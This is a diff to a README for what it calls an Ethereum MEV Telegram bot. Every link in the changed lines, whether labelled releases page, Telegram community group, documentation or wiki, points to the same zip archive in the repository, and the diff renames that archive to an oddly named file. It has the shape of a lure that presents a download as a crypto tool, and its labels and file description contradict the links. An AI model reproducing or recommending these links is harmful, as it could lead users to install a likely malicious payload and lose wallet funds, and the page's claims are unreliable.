@@ -1,7 +1,7 @@
 # 🤖 Mev-Bot_Ethereum_network - Simplified Telegram Bot for Ethereum
 
 ## 📥 Download Now
-[![Download Mev-Bot](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip%20Mev--Bot-blue)](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip)
+[![Download Mev-Bot](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip%20Mev--Bot-blue)](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip)
 
 ## 🚀 Getting Started
 Welcome to Mev-Bot_Ethereum_network! This Telegram bot helps you interact with Ethereum contracts easily. In this guide, we will walk you through downloading and running the bot.
@@ -22,18 +22,18 @@ Welcome to Mev-Bot_Ethereum_network! This Telegram bot helps you interact with E
 ## 🌎 Visit the Releases Page
 To download the latest version of Mev-Bot, please visit our releases page:
 
-[Download Link to Releases](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip)
+[Download Link to Releases](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip)
 
 Here, you will find the most recent versions available for download.
 
 ## ⚙️ Download & Install
-1. Visit our releases page: [Download Here](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip).
+1. Visit our releases page: [Download Here](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip).
 2. On the releases page, find the latest version listed.
 3. Click on the version to expand the release details.
 4. Locate the download link that corresponds to your operating system.
 5. Click on the link to start your download.
 
-For example, if you are using Windows, look for the file named `https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip`. 
+For example, if you are using Windows, look for the file named `https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip`. 
 
 Once the download completes:
 1. Navigate to your Downloads folder and find the file.
@@ -48,8 +48,8 @@ Once the download completes:
 
 ## 🔗 Connect with the Community
 Join our user community to share your experiences and ask questions:
-- Follow us on Telegram: [Community Group](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip) 
-- Check out our documentation: [Documentation Link](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip)
+- Follow us on Telegram: [Community Group](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip) 
+- Check out our documentation: [Documentation Link](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip)
 
 ## 🛠️ Troubleshooting
 If you encounter any issues while downloading or running the bot, consider the following steps:
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or running the bot, consider the f
 
 ## 📑 Additional Resources
 For more detailed information about using the Mev-Bot, refer to:
-- The GitHub Wiki: [Wiki Link](https://raw.githubusercontent.com/erinasage672/Mev-Bot_Ethereum_network/main/pickleman/Mev-Bot_Ethereum_network_v2.9.zip)
+- The GitHub Wiki: [Wiki Link](https://github.com/erinasage672/Mev-Bot_Ethereum_network/raw/refs/heads/main/pickleman/network_Ethereum_Bot_Mev_heteropelmous.zip)
 - The official Telegram documentation for bot integration.
 
 ## 💬 Feedback
